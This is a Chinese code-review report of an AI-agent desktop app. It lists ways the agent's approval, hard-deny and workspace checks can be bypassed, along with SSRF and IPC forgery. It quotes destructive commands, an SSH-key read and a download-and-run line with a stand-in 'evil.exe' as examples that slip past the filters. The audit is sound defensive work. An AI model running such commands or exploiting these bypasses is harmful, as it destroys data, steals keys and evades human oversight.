# DSH Desktop 全量代码审查报告（2026-11-13）

覆盖：main.js / preload.js / lib/*（tools.js, retry.js, safety.js）/ runtime/*（13 个文件）/ renderer/app.js / index.html / styles.css。共约 12,800 行。

> 说明：上次 Qoder 会话在审查刚开始时因额度耗尽中断（修了 main.js 外链安全、写了 lib/safety.js）。本报告接续完成。

---

## P0 — 安全边界穿透（必须修）

**1. `tool:exec` 直连通道完全绕过 policy / 审批 / 硬拒绝 — main.js:1119-1130**
渲染层可传 `permission:'full'` + 任意 workspace，直接执行 `run_command` / `write_file`，不经 `evaluatePolicy`。hard-deny 命令表、系统目录保护、工作区边界在此通道全部失效。审批（runtime executor 路径）存在旁路。
→ 收紧：不允许渲染层指定 permission='full' 与任意 workspace，强制走 runtime policy 路径。

**2. workspace 路径工具完全逃逸 — lib/tools.js:309-314**
`resolveToolPath` 对绝对路径直接放行，无 isWithinWorkspace / isSystemPath / symlink（realish）检查。`write_file` 可写系统盘任意位置，`read_file` 可经工作区内 junction 读出敏感文件。`run_command` cwd 同样无界，且不调用 hardDenyCommand。
→ tools.js 写路径补齐 realish + isSystemPath + 工作区边界。

**3. `lib/safety.js` 是死代码，且两份安全实现已漂移 — safety.js 全文**
无任何文件 require 它。runtime/policy.js:45-115 与 safety.js 逐字重复 SYSTEM_PREFIXES / HARD_DENY / normCase / realish 等 6 处，且 policy.js:112 的 `hardDenyCommand` 不做空白归一化（safety.js:47 有），可用 `format\t c:` 绕过。policy.js:60-61 正则漏洞：`rm -rf /*`、`del /s /q C:\*` 不命中。
→ policy.js 改为 re-export lib/safety.js；修硬拒绝正则（rm -rf /*、del /s /q C:\*、空白变体）。

**4. 子 Agent 免审批继承父 Run 高危授权 — executor.js:36/201/345 + state.js:1169-1183**
actionHash 用固定的 `this.agentId`（恒为 'agent_local'）而非 run.agentId；scope='task' 的 grant 写入任务所有 run，子 run 哈希相同 → 父级批准的 run_command 在子 Agent 中免审批执行。可复现的权限升级。
→ hash 混入 run.agentId；或 grant 按 agentId 收窄。

**5. 审批"本次会话都允许"key 前缀碰撞 — renderer/app.js:847/1517/1785/1919**
target 截断 160 字符作为 autoApproved key，run_command 整条命令前缀相同即误放行。
→ run_command 用未截断命令或其哈希做 key。

**6. 硬编码 API Key — renderer/app.js:19-23**
`DEFAULT_API.key = 'sk-…'` 明文随 asar 分发。

---

## P1 — 可用性 / 数据完整性

**7. `waiting_approval` 卡死 — executor.js:302 + state.js:1095-1128**
`sweepExpiredApprovals` 不重置 run 的 waiting_approval（仅 agent-runner 轮询路径复位）；多 pending 审批时处理一个即整体翻回 running。父 Run 审批过期后永久卡 waiting_approval。

**8. state.json 回退写非原子 — state.js:384-394 + events.js:94-103**
rename 失败直接覆盖写正式文件，崩溃即损坏；损坏快照静默回退空状态，全部记录丢失无告警；tmp 无 fsync。

**9. 审计/事件 IPC 可被渲染层伪造 — main.js:250-254**
`runtime:runs:begin-step/finish-step/model-*/finish`、`runtime:tools:propose/reconcile` 直接暴露，任意 IPC 注入伪造审计事件，破坏 auditVerify 意义。→ 收回为内部调用。

**10. `search_files` 正则灾难性回溯卡死主进程 — lib/tools.js:429-469**
同步在主进程跑模型给的 pattern，`(a+)+$` 类 pattern 冻结 UI，无超时。→ 加执行预算。

**11. fetch_url SSRF + 全量入内存 — lib/tools.js:612-651**
未挡 127.0.0.1 / 内网 / 169.254.169.254；响应体先全读再截断。且 fetch_url 在 READ_ONLY 集合（tools.js:35），模型可无审批调用。policy.js:125 normalizeUrl 同样无内网限制。

**12. "校验失败"状态被"已完成"覆盖 — renderer/app.js:1618-1630 + 2217**
finish() 同步覆盖 label，用户只看到"已完成"。

---

## P2 — 中低危 / 一致性

- 委派配额把被拒记录计入（delegation.js:151-153），5 次拒绝后永久无法委派。
- 子任务预算不预留、父 usage 不累计子消耗（delegation.js:35-59 + state.js:954-958）。
- executor.js:121 invalid-args proposal 丢 argsDigest，破坏可审计性。
- `--script=` 可 `..\..\` 跳出 assets 注入渲染层（main.js:131-144）→ 白名单限定。
- `normalizeBase` 允许 http 明文发 Bearer key（main.js:310-314）→ 仅 localhost 放行。
- 明文密钥回传渲染层常驻（main.js:269-284, preload.js:40-43）→ key 只留主进程。
- `msgStore` 永不清理、流式渲染 O(n²) innerHTML 重建（app.js:160-166, 1546-1554）。
- main.js:24 注释"深色默认"与代码 `'light'` 矛盾；main.js:1009 EMPTY_OUTPUT retryable 语义误导；main.js:478 sleep 中断参数无效。
- retry.js:146 JSDoc 与实现不一致（说 2×maxDelayMs，实际 60s 或 maxDelayMs）；main.js:1050-1052 复制同逻辑，又一处双实现。
- tools.js:606 HTML 实体解码 >0xFFFF 码点产孤立代理项。
- run_command 不受工作区约束（policy.js:282），`type C:\Users\…\.ssh\id_rsa` 绕过全部路径规则——黑名单固有局限，但当前它几乎是唯一命令防线。
- delegate_task 声明 workspaceOnly:true 但 policy 层不校验参数，仅靠 delegation.js 单点校验（tool-registry.js:60）。
- download-exec 检测只查 curl/wget 直连管道，`curl -o evil.exe http://... & evil.exe` 等不命中（policy.js:65）。
- 恢复路径 recoverInterrupted 一刀切（state.js:1249-1334）；graph.js 不抑制 end 后事件。
- `_prune` 可删仍被子任务引用的父任务（state.js:1336）。

## 已核对无问题的部分

- 渲染层 XSS 面整体控制良好：markdown 先 esc 再解析、链接限 https?、todo/工具结果/审批卡均过 esc()；CSP `script-src 'self'` 无 unsafe-eval；windowOpenHandler/will-navigate 防护完整。
- preload 暴露面与 app.js 调用完全对齐；重试配置链路一致。
- tool-registry 与 policy 的 workspaceOnly 声明基本一致（delegate_task 例外见上）。

## 建议修复顺序

1. P0 #1-#5：tool:exec 收紧 + tools.js 边界/symlink + safety.js 接线统一 + 审批 hash/ key 修复。
2. P1 #7-#9：waiting_approval 卡死、state.json 原子写、收回审计 IPC。
3. P1 #10-#12 与 P2 按需。
4. 修完跑全量回归（runtime 各 check + tool-e2e + self-check）。
